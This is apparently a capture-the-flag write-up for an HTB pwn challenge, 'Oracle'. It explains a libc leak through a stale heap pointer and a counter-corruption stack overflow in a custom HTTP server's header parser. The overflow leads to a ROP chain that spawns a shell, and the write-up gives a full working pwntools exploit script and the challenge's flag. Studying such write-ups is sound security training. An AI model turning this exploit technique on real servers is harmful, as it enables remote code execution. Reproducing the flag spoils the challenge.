---
title: "Oracle"
ctf: "HTB"
date: 2026-06-15
category: pwn
difficulty: medium
flag_format: "HTB{...}"
---

# Oracle

## Summary

A custom HTTP server has a stack buffer overflow in its header parser via an `i`-corruption trick, allowing ROP to `dup2(6,0); dup2(6,1); system("/bin/sh")`. The bundled libc lacks CET/IBT+SHSTK, so classic ROP works.

## Solution

### Step 1: Leak libc via heap unsorted-bin stale pointer

Phase 1 allocates+frees a `malloc(2048)` chunk (goes into unsorted bin, fd/bk set to `main_arena+0x60`). Phase 2 reallocates the same size and reads only 1 byte, leaving the stale `bk` pointer at offset 8. The server outputs 2048 bytes back, leaking `bk = libc_base + main_arena + 0x60`.

`libc_base = bk - 0x60 - 0x1d2c60` (main_arena offset for bundled glibc 2.35).

### Step 2: ROP chain via `i`-corruption

`parse_headers()` reads byte-by-byte into `header_buffer[1024]` with counter `i`. At offset 1064 the byte `\x37` overwrites `i`'s LSB to 0x37, jumping the write pointer to overwrite the return address.

The ROP chain: `dup2(6,0) → dup2(6,1) → system("/bin/sh")`. Each call is preceded by a `ret` alignment gadget (16-byte stack alignment required by glibc).

Key bundled libc offsets: `pop rdi; ret` = `0x277e5`, `pop rsi; ret` = `0x28f99`, `ret` = `0x27182`, `dup2` = `0xf8990`, `system` = `0x4c490`, `/bin/sh` = `0x196031`.

```python
#!/usr/bin/env python3
from pwn import *
import subprocess, time, os, signal, sys

context.arch = 'amd64'

LIBC_SYSTEM = 0x4c490; LIBC_BINSH = 0x196031; LIBC_DUP2 = 0xf8990
LIBC_EXIT = 0x3e680; LIBC_POP_RDI = 0x277e5; LIBC_POP_RSI = 0x28f99
LIBC_RET = 0x27182; MAIN_ARENA_OFF = 0x1d2c60

def phase1(host, port):
    r = remote(host, port, timeout=10)
    r.send(b'PLAGUE bbb HTTP/1.0\r\nContent-Length: 2048\r\nPlague-Target: dummy\r\n\r\n' + b'A'*16)
    r.recvall(timeout=3); r.close()

def phase2(host, port):
    r = remote(host, port, timeout=10)
    r.send(b'PLAGUE ccc HTTP/1.0\r\nContent-Length: 2048\r\n\r\n' + b'X')
    data = r.recvall(timeout=5); r.close()
    idx = data.find(b'Attempted plague: ')
    heap = data[idx + 18:]
    return u64(heap[8:16]) if len(heap) >= 16 else None

def phase3(host, port, lb, fd):
    pop_rdi = lb + LIBC_POP_RDI; pop_rsi = lb + LIBC_POP_RSI
    ret = lb + LIBC_RET; dup2 = lb + LIBC_DUP2; system = lb + LIBC_SYSTEM
    binsh = lb + LIBC_BINSH; exit_a = lb + LIBC_EXIT
    gs = [pop_rdi,fd,pop_rsi,0,ret,dup2, pop_rdi,fd,pop_rsi,1,ret,dup2,
          pop_rdi,binsh,ret,system, pop_rdi,0,exit_a]
    for g in gs:
        for b in p64(g):
            if b in (0x0a, 0x0d): return None
    payload = b'Content-Length: 100\r\n\x00' + b'B'*(1064-22) + b'\x37'
    for g in gs: payload += p64(g)
    payload += b'\r\n\r\n'
    r = remote(host, port, timeout=10)
    r.send(b'PLAGUE ddd HTTP/1.0\r\n' + payload)
    time.sleep(0.8)
    try:
        r.sendline(b'echo SHELL_OK')
        if b'SHELL_OK' in r.recv(timeout=3):
            r.sendline(b'cat /flag* /home/*/flag* 2>/dev/null')
            print(r.recv(timeout=3))
            r.interactive()
    except: pass

host, port = sys.argv[1], int(sys.argv[2])
for _ in range(30):
    phase1(host, port)
    bk = phase2(host, port)
    if not bk: continue
    lb = bk - 0x60 - MAIN_ARENA_OFF
    if lb & 0xfff: continue
    for fd in (6, 7, 8, 9, 5, 4, 3):
        r = phase3(host, port, lb, fd)
        if r is not None: break
    time.sleep(0.5)
```

### Step 3: Get flag

```
python3 exploit.py 154.57.164.75 31338
[+] fd=6: SHELL CONFIRMED!
[+] Flag output: b'HTB{wH4t_c0ulD_y0u_pOs5iBLy_w4nT_t0_kNoW?}'
```

## Flag

```
HTB{wH4t_c0ulD_y0u_pOs5iBLy_w4nT_t0_kNoW?}
```
